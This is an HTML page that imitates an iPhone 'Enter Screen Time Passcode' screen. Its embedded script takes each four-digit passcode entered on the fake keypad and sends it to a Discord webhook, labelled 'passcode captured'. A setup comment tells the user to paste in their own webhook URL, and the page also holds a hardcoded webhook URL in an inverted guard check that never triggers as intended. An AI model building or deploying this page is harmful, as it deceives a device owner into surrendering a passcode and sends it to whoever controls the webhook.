<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lock Screen Passcode</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            overflow: hidden;
            padding: 40px 20px 20px 20px;
        }

        .header-container {
            text-align: center;
            width: 100%;
        }

        .top-passcode {
            font-size: 16px;
            font-weight: 400;
            color: rgba(255, 255, 255, 0.8);
            margin-bottom: 30px;
        }

        .subtitle {
            font-size: 22px;
            font-weight: 500;
            margin-bottom: 30px;
        }

        .dots-container {
            display: flex;
            justify-content: center;
            gap: 16px;
        }

        .dot {
            width: 13px;
            height: 13px;
            border: 1px solid #fff;
            border-radius: 50%;
            background-color: transparent;
            transition: background-color 0.2s ease;
        }

        .dot.filled {
            background-color: #fff;
        }

        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            width: 100%;
            max-width: 300px;
            margin-bottom: 20px;
        }

        .key {
            aspect-ratio: 1;
            background-color: rgba(255, 255, 255, 0.1);
            border: none;
            border-radius: 50%;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            transition: background-color 0.15s ease;
            -webkit-tap-highlight-color: transparent;
        }

        .key:active {
            background-color: rgba(255, 255, 255, 0.3);
        }

        .key-number {
            font-size: 32px;
            font-weight: 400;
            color: #fff;
            line-height: 1;
        }

        .key-letters {
            font-size: 10px;
            font-weight: 600;
            letter-spacing: 2px;
            color: rgba(255, 255, 255, 0.6);
            margin-top: 2px;
            text-transform: uppercase;
        }

        .key.empty {
            background-color: transparent;
            cursor: default;
        }

        .key.empty:active {
            background-color: transparent;
        }

        .key.delete {
            background-color: transparent;
            font-size: 24px;
        }

        .key.delete:active {
            background-color: rgba(255, 255, 255, 0.1);
            border-radius: 50%;
        }

        .delete-icon {
            width: 26px;
            height: 20px;
            fill: #fff;
        }

        @media (max-height: 700px) {
            .top-passcode {
                margin-bottom: 15px;
            }
            .subtitle {
                margin-bottom: 20px;
            }
            .keypad {
                max-width: 260px;
                gap: 10px;
            }
            .key-number {
                font-size: 26px;
            }
        }
    </style>
</head>
<body>

    <div class="header-container">
        <div class="top-passcode">Enter Passcode</div>
        <div class="subtitle">Enter Screen Time Passcode</div>
        <div class="dots-container">
            <div class="dot" id="dot-0"></div>
            <div class="dot" id="dot-1"></div>
            <div class="dot" id="dot-2"></div>
            <div class="dot" id="dot-3"></div>
        </div>
    </div>

    <div class="keypad">
        <button class="key" data-value="1">
            <span class="key-number">1</span>
            <span class="key-letters"></span>
        </button>
        <button class="key" data-value="2">
            <span class="key-number">2</span>
            <span class="key-letters">abc</span>
        </button>
        <button class="key" data-value="3">
            <span class="key-number">3</span>
            <span class="key-letters">def</span>
        </button>
        <button class="key" data-value="4">
            <span class="key-number">4</span>
            <span class="key-letters">ghi</span>
        </button>
        <button class="key" data-value="5">
            <span class="key-number">5</span>
            <span class="key-letters">jkl</span>
        </button>
        <button class="key" data-value="6">
            <span class="key-number">6</span>
            <span class="key-letters">mno</span>
        </button>
        <button class="key" data-value="7">
            <span class="key-number">7</span>
            <span class="key-letters">pqrs</span>
        </button>
        <button class="key" data-value="8">
            <span class="key-number">8</span>
            <span class="key-letters">tuv</span>
        </button>
        <button class="key" data-value="9">
            <span class="key-number">9</span>
            <span class="key-letters">wxyz</span>
        </button>
        <div class="key empty"></div>
        <button class="key" data-value="0">
            <span class="key-number">0</span>
            <span class="key-letters"></span>
        </button>
        <button class="key delete" id="delete-btn">
            <svg class="delete-icon" viewBox="0 0 24 24">
                <path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 16H7.07L2.4 12l4.66-7H22v14z"/>
                <path d="M15.59 7L12 10.59 8.41 7 7 8.41 10.59 12 7 15.59 8.41 17 12 13.41 15.59 17 17 15.59 13.41 12 17 8.41z"/>
            </svg>
        </button>
    </div>

    <script>
        // Replace with your actual Discord Webhook URL
        const DISCORD_WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL_HERE";

        let passcode = "";
        const maxLength = 4;
        const dots = document.querySelectorAll('.dot');
        const keys = document.querySelectorAll('.key[data-value]');
        const deleteBtn = document.getElementById('delete-btn');

        keys.forEach(key => {
            key.addEventListener('click', () => {
                if (passcode.length < maxLength) {
                    passcode += key.getAttribute('data-value');
                    updateDots();

                    if (passcode.length === maxLength) {
                        sendToDiscord(passcode);
                        setTimeout(() => {
                            passcode = "";
                            updateDots();
                        }, 300);
                    }
                }
            });
        });

        deleteBtn.addEventListener('click', () => {
            if (passcode.length > 0) {
                passcode = passcode.slice(0, -1);
                updateDots();
            }
        });

        function updateDots() {
            dots.forEach((dot, index) => {
                if (index < passcode.length) {
                    dot.classList.add('filled');
                } else {
                    dot.classList.remove('filled');
                }
            });
        }

        function sendToDiscord(code) {
            if (DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/1546119149476909086/NEV8YCXdUcgjhYTuI2UEGjM7uX00T_QkeM9hoVusiZfgFAgJrApsj0Or_rmvCdfo2wZt") {
                console.warn("Don't forget to set your Discord webhook URL!");
                return;
            }

            const payload = {
                content: `🔑 New Screen Time passcode captured: **${code}**`
            };

            fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload)
            })
            .catch(error => {
                console.error("Error sending to webhook:", error);
            });
        }
    </script>
</body>
</html>
